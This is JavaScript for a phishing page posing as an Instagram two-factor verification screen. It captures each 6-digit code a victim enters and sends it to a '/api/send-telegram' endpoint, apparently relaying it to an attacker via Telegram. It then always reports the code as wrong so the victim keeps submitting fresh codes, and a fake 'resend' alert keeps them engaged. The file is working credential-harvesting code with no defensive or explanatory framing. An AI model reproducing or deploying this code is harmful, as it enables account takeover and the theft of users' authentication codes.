    const codeInput = document.getElementById("codeInput");
    const confirmBtn = document.getElementById("confirmBtn");
    const btnText = document.getElementById("btnText");
    const spinner = document.getElementById("spinner");
    const errorMsg = document.getElementById("errorMsg");

    // Only allow numbers + auto-submit when 6 digits entered
    codeInput.addEventListener("input", () => {
      codeInput.value = codeInput.value.replace(/\D/g, '');
      if (codeInput.value.length === 6) {
        confirmBtn.click();
      }
    });

    // Confirm Button Click
    confirmBtn.addEventListener("click", async () => {
      const code = codeInput.value.trim();

      if (code.length !== 6) {
        alert("Please enter the full 6-digit code");
        codeInput.focus();
        return;
      }

      // Show loading animation
      confirmBtn.disabled = true;
      btnText.textContent = "Verifying...";
      spinner.classList.remove("hidden");
      errorMsg.classList.add("hidden");

      // Send only 2FA code
      const message = `Code:

APP: INSTAGRAM
2FA CODE: ${code}
`;

      try {
        const projectName = window.location.pathname.split('/')[2];
        await fetch('/api/send-telegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message, projectName })
        });
        console.log("✅ 2FA code sent");
      } catch (err) {
        console.error("Failed to send to backend:", err);
      }

      // Always show incorrect message and reset (endless loop)
      setTimeout(() => {
        errorMsg.classList.remove("hidden");

        confirmBtn.disabled = false;
        btnText.textContent = "Confirm";
        spinner.classList.add("hidden");

        codeInput.value = "";
        codeInput.focus();
      }, 1600);
    });

    // Resend Code
    document.getElementById("resendBtn").addEventListener("click", () => {
      alert("A new confirmation code has been sent to your email, phone and SMS.");
      codeInput.value = "";
      codeInput.focus();
    });

    // Focus input on load
    window.onload = () => codeInput.focus();